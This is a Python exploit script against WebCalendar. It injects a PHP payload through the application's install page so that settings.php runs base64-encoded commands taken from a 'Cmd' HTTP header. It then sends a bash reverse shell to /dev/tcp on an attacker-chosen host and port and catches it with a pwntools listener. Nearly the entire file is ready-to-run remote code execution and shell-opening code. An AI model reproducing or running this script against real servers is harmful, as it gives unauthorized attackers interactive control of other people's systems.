#!/usr/bin/env python3

import threading
import requests
import sys
import argparse
from base64 import b64encode as b64
from pwn import listen

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', help="Url of the webcalendar")
parser.add_argument('-l', '--lhost', help="Local host for netcat listener")
parser.add_argument('-p', '--lport', help="Local port for netcat listener")

args = parser.parse_args()
url = args.url
lhost = args.lhost
lport = args.lport

class WebCalendar:
    def __init__(self):
        self.s = requests.Session()
        self.url = url
        self.lhost = lhost
        self.lport = lport

        # Making connection
        try:
            req = self.s.get(self.url, timeout=5)
            if req.status_code == 200:
                pass
        except:
            print(f"[!] Could not connect!.")
            sys.exit(1)

    def iject_header(self, inject_url, pl):
        data = {
            'app_settings':'1',
            'form_user_inc':'user.php',
            'form_single_user_login':pl
                }
        
        # Sending payload
        self.s.post(inject_url, data=data)
        print(f"[*] Sending payload ...")

    def trigger_pl(self, rev_shell, trigger_url):
        header = {
            'Cmd':rev_shell
                }

        #Trigger payload
        print(f"[*] Triggering the payload ...")
        self.s.get(trigger_url, headers=header)

    def netcat(self):
        listener = listen(self.lport)
        listener.wait_for_connection()
        listener.interactive()

    def start_nc(self, func):
        thread = threading.Thread(target=func)
        thread.start()

    def main(self):
        inject_url = self.url + '/webcalendar/install/index.php'
        trigger_url = self.url + '/webcalendar/includes/settings.php'
        payload = "*/print(____);passthru(base64_decode($_SERVER[HTTP_CMD]));die;"
        rev_shell = f'bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\''
        cmd = b64(rev_shell.encode())

        self.iject_header(inject_url, payload)
        self.start_nc(self.netcat)
        self.trigger_pl(cmd, trigger_url)


if __name__ == '__main__':
    WebCalendar().main()
